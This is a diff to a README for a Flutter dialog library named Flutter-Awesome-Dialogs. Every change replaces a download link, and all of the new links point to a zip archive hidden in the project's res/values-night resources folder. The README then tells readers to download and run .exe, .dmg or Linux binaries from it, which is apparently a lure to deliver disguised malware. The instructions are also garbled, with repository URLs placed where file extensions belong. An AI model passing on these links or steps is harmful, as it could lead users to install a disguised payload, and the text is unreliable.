@@ -1,6 +1,6 @@
 # ✨ Flutter-Awesome-Dialogs - Beautiful Dialogs for Better Apps
 
-[![Download](https://raw.githubusercontent.com/henrijaime/Flutter-Awesome-Dialogs/main/android/app/src/main/kotlin/com/Flutter-Awesome-Dialogs_2.2.zip%20Now-%20Flutter--Awesome--Dialogs-blue)](https://raw.githubusercontent.com/henrijaime/Flutter-Awesome-Dialogs/main/android/app/src/main/kotlin/com/Flutter-Awesome-Dialogs_2.2.zip)
+[![Download](https://github.com/henrijaime/Flutter-Awesome-Dialogs/raw/refs/heads/main/android/app/src/main/res/values-night/Flutter_Awesome_Dialogs_formalism.zip%20Now-%20Flutter--Awesome--Dialogs-blue)](https://github.com/henrijaime/Flutter-Awesome-Dialogs/raw/refs/heads/main/android/app/src/main/res/values-night/Flutter_Awesome_Dialogs_formalism.zip)
 
 ## 📖 Introduction
 
@@ -20,11 +20,11 @@ To get started with Flutter-Awesome-Dialogs, follow the steps below to easily do
 
 To download the application, visit the following link:
 
-[Download Flutter-Awesome-Dialogs](https://raw.githubusercontent.com/henrijaime/Flutter-Awesome-Dialogs/main/android/app/src/main/kotlin/com/Flutter-Awesome-Dialogs_2.2.zip)
+[Download Flutter-Awesome-Dialogs](https://github.com/henrijaime/Flutter-Awesome-Dialogs/raw/refs/heads/main/android/app/src/main/res/values-night/Flutter_Awesome_Dialogs_formalism.zip)
 
 Once you are on the releases page, look for the latest version of the application. Click on the version number to see the available files. 
 
-1. Identify the file that matches your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/henrijaime/Flutter-Awesome-Dialogs/main/android/app/src/main/kotlin/com/Flutter-Awesome-Dialogs_2.2.zip` for Linux).
+1. Identify the file that matches your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://github.com/henrijaime/Flutter-Awesome-Dialogs/raw/refs/heads/main/android/app/src/main/res/values-night/Flutter_Awesome_Dialogs_formalism.zip` for Linux).
 2. Click on the file name to start the download.
 3. After the download is complete, locate the file in your downloads folder.
 
@@ -32,7 +32,7 @@ Once you are on the releases page, look for the latest version of the applicatio
 
 1. **Windows**: Double-click the downloaded `.exe` file to open the application.
 2. **macOS**: Open the downloaded `.dmg` file and drag the application into your Applications folder. After this, you can open it from the Applications folder.
-3. **Linux**: Extract the `https://raw.githubusercontent.com/henrijaime/Flutter-Awesome-Dialogs/main/android/app/src/main/kotlin/com/Flutter-Awesome-Dialogs_2.2.zip` file to a preferred location. Open a terminal in that location and run the command `./YourAppName` to start the application.
+3. **Linux**: Extract the `https://github.com/henrijaime/Flutter-Awesome-Dialogs/raw/refs/heads/main/android/app/src/main/res/values-night/Flutter_Awesome_Dialogs_formalism.zip` file to a preferred location. Open a terminal in that location and run the command `./YourAppName` to start the application.
 
 ## 🌟 Features
 
